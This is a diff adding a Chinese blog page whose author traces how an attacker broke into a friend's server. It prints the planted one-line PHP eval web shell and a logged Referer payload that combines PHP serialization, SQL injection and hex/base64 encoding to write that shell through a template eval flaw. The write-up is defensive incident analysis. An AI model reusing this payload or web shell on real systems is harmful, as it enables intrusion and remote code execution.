@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+<link rel="stylesheet" href="/css/main.css">
+
+    <title>
+    
+        记录一次服务器被Sql注入的排查过程 - 
+     
+    地铁三号线不相信眼泪
+</title>
+    <link rel="alternate" href="/rss.xml" type="application/atom+xml">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="description" content="蓝天、大地，还有清风,正指引我前进。">
+    <meta name="keywords" content="vhvy" >
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+    <div id="root">
+        <aside class="aside-wrap" style="background-image: url(https://i.loli.net/2020/12/08/oQ6CXL43HDWpB2I.jpg); width: 300px">
+    <img src="https://i.loli.net/2020/12/08/mKOT8BgjFwbof4p.jpg" class="user-avatar" alt="avatar"> 
+
+    <div class="nav-wrap">
+        <h1 class="author">vhvy</h1>
+        <p class="subtitle">刀斩肉身，心斩灵魂。</p>
+        <ul class="nav-list">
+            
+            
+            <li class="nav-item">
+                <a href="/ ">首页 </a>
+            </li>
+            
+            
+            
+            <li class="nav-item">
+                <a href="/categories ">分类 </a>
+            </li>
+            
+            
+            
+            <li class="nav-item">
+                <a href="/tags ">标签 </a>
+            </li>
+            
+            
+            
+            <li class="nav-item">
+                <a href="/chaos ">混沌 </a>
+            </li>
+            
+            
+            
+            <li class="nav-item">
+                <a href="/archives ">归档 </a>
+            </li>
+            
+            
+            
+            <li class="nav-item">
+                <a href="/blogroll ">友链 </a>
+            </li>
+            
+            
+            
+            <li class="nav-item">
+                <a href="/about ">关于 </a>
+            </li>
+            
+            
+        </ul>
+        <ul class="sub-nav-list">
+            
+            <li class="sub-nav-item">
+                <a target="_blank" rel="noopener" href="https://github.com/vhvy " aria-label="github" title="github" style="background-image: url(https://i.loli.net/2020/11/15/KgnCLhyWJaYpX3U.png);background-color: #fff;background-position: 40%"></a>
+            </li>
+            
+            <li class="sub-nav-item">
+                <a href="mailto:vhvy@qq.com " aria-label="email" title="email" style="background-image: url(https://i.loli.net/2020/11/15/ZGnqMQsFutvEcdb.png);background-color: #fff;background-size: 70%"></a>
+            </li>
+            
+            <li class="sub-nav-item">
+                <a href="/rss.xml " aria-label="rss" title="rss" style="background-image: url(https://i.loli.net/2020/11/15/mkNMb9soJOVTQWL.png);background-color: #ef7522;background-size: 65%"></a>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+        <main class="body-box" style="margin-left: 300px;">
+            <article class="container">
+                
+<link rel="stylesheet" href="/css/content.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/prismjs@1.22.0/themes/prism.css">
+
+
+
+<div class="content-box">
+    <div class="meta">
+    <div class="date">
+        <time>Jun 06, 2021</time>
+    </div>
+</div>
+
+    <h1 class="title">记录一次服务器被Sql注入的排查过程</h1>
+    <div class="content">
+        
+        
+            
+<link rel="stylesheet" href="/css/toc-box.css">
+
+            <div id="toc-wrap">
+                <p>
+                    <strong>文章目录</strong>
+                </p>
+
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5"><span class="toc-text">排查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91"><span class="toc-text">分析业务逻辑</span></a></li></ol>
+            </div>
+        
+        
+        
+         
+        <p>下午，我正在河边散步，突然朋友给我发了一条短信截图，让我帮他看看啥情况。</p>
+<p><img  src="https://i.loli.net/2021/06/06/YcUyJTBV7ExC6hp.gif" data-original="https://i.loli.net/2021/06/06/UTwXmaYW6rAEpMn.png" alt="UTwXmaYW6rAEpMn"/></p>
+<h2 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h2><p>连上服务器，先停了web服务器。看了下根目录果然多出了一个<code>userr.php</code>文件，内容如下：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>usrr<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$str</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">s</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"usrr"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>一看<code>eval</code>我就感觉大事不妙，这是被人家把底裤都扒了个精光。好在这台服务器没啥价值，上面的业务也处于停滞状态。不过遇到这种问题还是要排查一下的。</p>
+<p>先看一下<code>nginx</code>的响应日志，按照腾讯云提供的这个时间<code>2021-06-05 16:44:53</code>，发现了一条这样的记录：</p>
+<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token number">113.237</span><span class="token number">.187</span><span class="token number">.191</span> <span class="token operator">-</span> <span class="token operator">-</span><span class="token punctuation">[</span><span class="token number">05</span> <span class="token operator">/</span> Jun <span class="token operator">/</span> <span class="token number">2021</span><span class="token punctuation">:</span> <span class="token number">16</span><span class="token punctuation">:</span> <span class="token number">44</span><span class="token punctuation">:</span> <span class="token number">52</span> <span class="token operator">+</span> <span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string">"GET /user.php?act=login HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">1811</span> <span class="token string">"554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:\x22num\x22;s:456:\x22*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7B24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F496E567A5A584A794C6E426F634349734A7A7830615852735A54353163334A7950433930615852735A5434385033426F6343416B6333527950534978496A746D6457356A64476C766269427A4B43527A64484970653256325957776F496949754A484E306369346949696B3766584D6F4A46395154314E5557794A3163334A79496C30704F7A382B4A796B372729293B2F2F7D787878,10-- -\x22;s:2:\x22id\x22;s:3:\x22'/*\x22;&#125;"</span> <span class="token string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>看了下<code>nginx</code>日志响应的格式，最长的这个字符串是<code>Referer</code>，其中<code>|</code>后面是一个php序列化后的字符串，里面嵌入了一个<code>sql</code>语句，后面还有一个很长的16进制数字，先把这个疑似php序列化字符串反序列化一下看看。</p>
+<p><img  src="https://i.loli.net/2021/06/06/YcUyJTBV7ExC6hp.gif" data-original="https://i.loli.net/2021/06/06/Y7WLIGismP4DhRx.png" alt="Y7WLIGismP4DhRx"/></p>
+<p>emm，有<code>num</code>有<code>id</code>，看样子和业务逻辑还有关联，直接看代码吧。不过在这之前看一下这个十六进制数字是啥东西吧。</p>
+<p><img  src="https://i.loli.net/2021/06/06/YcUyJTBV7ExC6hp.gif" data-original="https://i.loli.net/2021/06/06/3vqUienQaMfwDbX.png" alt="3vqUienQaMfwDbX"/></p>
+<p>再解一下<code>base64</code>：</p>
+<p><img  src="https://i.loli.net/2021/06/06/YcUyJTBV7ExC6hp.gif" data-original="https://i.loli.net/2021/06/06/z7wQJbVXl8CMR3g.png" alt="z7wQJbVXl8CMR3g"/></p>
+<p>好家伙，原来是这么写进去的，看一下业务逻辑吧。</p>
+<h2 id="分析业务逻辑"><a href="#分析业务逻辑" class="headerlink" title="分析业务逻辑"></a>分析业务逻辑</h2><p><code>nginx</code>响应日志里是从<code>user.php?act=login</code>进去的，跟踪一下执行流程，发现有一处关键的流程使用了<code>HTTP_REFERER</code>:</p>
+<p><img  src="https://i.loli.net/2021/06/06/YcUyJTBV7ExC6hp.gif" data-original="https://i.loli.net/2021/06/06/4mc8UCSOiEF2pX7.png" alt="4mc8UCSOiEF2pX7"/></p>
+<p>接下来挂载相应变量后调用了<code>display</code>方法，继续深入:</p>
+<p><img  src="https://i.loli.net/2021/06/06/YcUyJTBV7ExC6hp.gif" data-original="https://i.loli.net/2021/06/06/i9cRvPZntd67AsE.png" alt="i9cRvPZntd67AsE"/></p>
+<p>继续跟踪下去，这里<code>$this-&gt;fetch</code>获取模版内容。</p>
+<p><img  src="https://i.loli.net/2021/06/06/YcUyJTBV7ExC6hp.gif" data-original="https://i.loli.net/2021/06/06/R7WiaAyhctwQ4Hg.png" alt="R7WiaAyhctwQ4Hg"/></p>
+<p>获取模版内容并<code>eval</code>：</p>
+<p><img  src="https://i.loli.net/2021/06/06/YcUyJTBV7ExC6hp.gif" data-original="https://i.loli.net/2021/06/06/cpNReVUPHhvQ3jx.png" alt="cpNReVUPHhvQ3jx"/></p>
+<p>进行<code>eval</code>：</p>
+<p><img  src="https://i.loli.net/2021/06/06/YcUyJTBV7ExC6hp.gif" data-original="https://i.loli.net/2021/06/06/sdSZhi1XvuNyBOc.png" alt="sdSZhi1XvuNyBOc"/></p>
+<p>模版中使用了<code>$back_act</code>变量：</p>
+<p><img  src="https://i.loli.net/2021/06/06/YcUyJTBV7ExC6hp.gif" data-original="https://i.loli.net/2021/06/06/mQAb6g8k4faxyTL.png" alt="mQAb6g8k4faxyTL"/></p>
+<p>回到<code>display</code>函数，获取到模版内容后用<code>_echash</code>变量进行了切割，这个<code>_echash</code>在原本的代码中是<code>554fcae493e564ee0dc75bdf2ebf94ca</code>，而现在是<code>554fcae493e564ee0dc75bdf2ebf94caads</code>，相比之下多出来一个<code>ads</code>。</p>
+<p>切割后的<code>$k</code>变量中的奇数位置正好含有注入的恶意代码，然后进入了<code>insert_mod</code>函数：</p>
+<p><img  src="https://i.loli.net/2021/06/06/YcUyJTBV7ExC6hp.gif" data-original="https://i.loli.net/2021/06/06/R7WiaAyhctwQ4Hg.png" alt="R7WiaAyhctwQ4Hg"/></p>
+<p>这里先将字符串用<code>|</code>进行切割，然后对恶意代码进行了反序列化，并，<code>$fun</code>成了<code>insert_ads</code>函数，并执行相应的函数:</p>
+<p><img  src="https://i.loli.net/2021/06/06/YcUyJTBV7ExC6hp.gif" data-original="https://i.loli.net/2021/06/06/EPc64QLaqoSbfJX.png" alt="EPc64QLaqoSbfJX"/></p>
+<p>最终带入了<code>sql</code>语句并被执行。</p>
+<p><img  src="https://i.loli.net/2021/06/06/YcUyJTBV7ExC6hp.gif" data-original="https://i.loli.net/2021/06/06/j75XcWpdrsDCUov.png" alt="j75XcWpdrsDCUov"/></p>
+<p>写完后才发现这个漏洞早被别人抓出来了<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw">链接</a>，好吧。</p>
+
+    </div>
+</div>
+
+<div class="pagination">
+    
+    
+    <a href="/2021/05/30/实现一个简单的横向滑动菜单栏/" class="link next">实现一个简单的横向滑动菜单栏</a>
+    
+</div>
+
+
+<script src="/js/content.js"></script>
+
+            </article>
+            <footer class="footer">
+    <p class="copyright">©️ 2018 - 2021 地铁三号线不相信眼泪</p>
+    <p class="powered">Powered By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/vhvy/hexo-theme-veni">Veni</a></p>
+</footer>
+        </main>
+    </div>
+</body>
+
+</html>
